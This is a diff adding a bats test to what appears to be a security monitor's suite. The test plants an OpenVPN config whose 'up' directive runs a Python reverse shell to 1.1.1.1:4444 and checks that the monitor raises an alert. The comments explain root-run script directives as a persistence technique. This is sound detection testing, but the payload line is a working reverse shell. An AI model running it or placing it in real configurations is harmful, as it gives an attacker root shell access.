@@ -273,3 +273,14 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on OpenVPN script directive surface)" {
+    # Sister to nc / curl|bash / wget|sh OpenVPN script
+    # directive rev-shell variants already locked. Python is
+    # on every Debian/Ubuntu host. Locks python axis on T1546
+    # VPN-event-trigger root-exec persistence — script
+    # directives run AS ROOT on every connect/disconnect/route-up.
+    printf 'client\ndev tun\nup /bin/sh -c "python -c \\"import socket,os,pty;s=socket.socket();s.connect((\\\\\\"1.1.1.1\\\\\\",4444));os.dup2(s.fileno(),0);pty.spawn(\\\\\\"/bin/sh\\\\\\")\\""\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
